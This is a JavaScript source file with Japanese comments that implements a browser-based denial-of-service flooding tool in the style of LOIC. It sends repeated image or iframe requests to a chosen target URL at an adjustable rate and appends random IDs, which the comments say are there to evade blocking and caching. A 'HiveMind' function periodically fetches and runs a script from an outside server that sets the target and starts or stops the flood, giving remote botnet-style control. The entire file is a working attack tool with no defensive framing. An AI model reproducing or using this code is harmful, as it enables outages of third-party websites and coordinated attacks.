//グローバル変数
//※あんまり良くない癖があるから修正をかけるかも(気が向いたら)
//↑たぶんしない
var fireInterval;
var shootID;
var typeValue = 'img';
var state = 'stop';
var shootRequest = {};

//URLの先頭に "http://"が付くように修正するためのやつ（確か
/*
function httpValue(){
	if ($('#target').val().substr(0,7) != "http://") {
		$('#target').val('http://'+$('#target').val());
	}
	
	if ($('#hiveURL').val().substr(0,7) != "http://") {
		$('#hiveURL').val('http://'+$('#hiveURL').val());
	}
}
*/

//URLを修正して追加するところ
function arrayValue(url,type){
	if (type == 'target'){
		if (/\?/.test(url)){
			return '&TLOWC=';
		}
		else {
			return '?TLOWC=';
		}
	}
	else {
		if (/\?/.test(url)){
			return '&ID=';
		}
		else {
			return '?ID=';
		}
	}
}

//スライド値変更時のケーデンスを変更するやつ
function move_slide(){
	if (state == 'stop'){
		return;
	}
	preshoot($('#sl0').mbgetVal());
}

//攻撃開始ボタン操作
function start_stop(){
	if (state == 'stop'){
		state = 'start';
		$('#start').val('STOP TEH\nFLOODING');
		preshoot($('#sl0').mbgetVal());
	}
	else {
		state = 'stop';
		$('#start').val('IMMA CHARGING\nMAH LAZER');
		clearInterval(fireInterval);
	}
}

//ボタンの見た目の設定
function shootType(type){
	$('#counter_requested').html('0');
	$('#counter_tail').html('0');
	if (type == 'img'){
		$('#typeStyle').html('<style>#radio1{border-color:#5696C0;} #radio2{border-color:#000000;} #interval2{display:none;} #counter_tail,#of{visibility:visible;}</style>');
		typeValue = 'img';
		$('#sl0').mbsetVal(200);
	}
	else {
		$('#typeStyle').html('<style>#radio2{border-color:#5696C0;} #radio1{border-color:#000000;} #counter_tail,#of{visibility:hidden;}</style>');
		typeValue = 'iframe';
		$('#sl0').mbsetVal(3000);
	}
	move_slide();
}

//攻撃の変数
//URLと一緒に読み込まれるランダムな配列IDは、ブロックを回避するためのやつ
//ブラウザのキャッシュを使って、ファイルを再ダウンロードする
//---------------------------
//画像のリクエストをする(img攻撃)
var shoot1 = function () {
	var targetURL = $('#target').val();
	var msg = $('#msg').val();
	var shootID = Number(new Date());
	var resource = document.createElement('img');
	resource.setAttribute('src',targetURL+arrayValue(targetURL,'target')+msg+'&ID='+Number(new Date()));
	resource.setAttribute('onload','score_requested('+shootID+')'); //なんか
	resource.setAttribute('onabort','score_requested('+shootID+')'); //エラーを出すけど
	resource.setAttribute('onerror','score_requested('+shootID+')'); //サーバーから応答があればいいと思う（てきとー
	resource.setAttribute('id',shootID);
	$('#imgContainer').append(resource);
	score_tail();
}

//Iframe攻撃のやつ
var shoot2 = function () {
	var targetURL = $('#target').val();
	var msg = $('#msg').val();
	var shootID = Number(new Date());
	var resource = document.createElement('iframe');
	resource.setAttribute('src',targetURL+arrayValue(targetURL,'target')+msg+'&ID='+Number(new Date()));
	resource.setAttribute('onload','score_requested('+shootID+')');
	resource.setAttribute('id',shootID);
	$('#frameContainer').append(resource);
	score_tail();
}
//---------------------------

//攻撃変数の範囲を呼び出す
function preshoot(interval){
	if (typeValue == 'img'){
		clearInterval(fireInterval);
		fireInterval = setInterval(shoot1,interval)
	}
	else {
		clearInterval(fireInterval);
		fireInterval = setInterval(shoot2,interval)
	}
}

//実行された時の間隔
function score_tail(){
	$('#counter_tail')[0].innerHTML++
}

//攻撃対象サイトの完全アップロードをする
function score_requested(shootID){
	$('#counter_requested')[0].innerHTML++
	$('#'+shootID).remove();
}

//HiveMindボタンの操作
function hive(){
	if ($('#hivebutton').val() == 'Connect'){
		$('#hivebutton').val('Disconnect');
		load_hive();
	}
	else {
		$('#hivebutton').val('Connect');
	}
}

//外部サーバーからHiveMindをロードします。
//URLと一緒に読み込まれるランダムなIDは、このIDを読み込むことができないようにするため
//ブラウザのキャッシュを利用し、ファイルを再ダウンロードする
function load_hive(){
	if ($('#hivebutton').val() == 'Disconnect'){
		var hiveURL = $('#hiveURL').val();
		var hiveID = Number(new Date());
		var hiveScript = document.createElement('script');
		hiveScript.setAttribute('type','text/javascript'),
		hiveScript.setAttribute('src',hiveURL+arrayValue(hiveURL,'hive')+hiveID);
		hiveScript.setAttribute('onload','change_hive('+hiveID+');');
		hiveScript.setAttribute('onabort','change_hive('+hiveID+');');
		hiveScript.setAttribute('onerror','change_hive('+hiveID+');');
		hiveScript.setAttribute('id',hiveID);
		document.getElementById('hiveContainer').appendChild(hiveScript);
		setTimeout('load_hive();',10000);
	}
}

//change_hive()で取得した値を変更する
function change_hive(hiveID){
	$('#target').val(info.target);
	$('#msg').val(info.msg);
	if (info.status == 'start') {
		state = 'stop';
		start_stop();
	}
	else {
		state = 'start';
		start_stop();
	}
	$('#'+hiveID).remove();
}

//フォーカス取得時の"http://"を削除する
function erase(id){
	if ($(id).val() == 'https://'){
		$(id).val('');
	}
}

//フォーカスが外れた場合、"http://"をつけなおす
function reload(id){
	if ($(id).val() == ''){
		$(id).val('http://');
	}
}
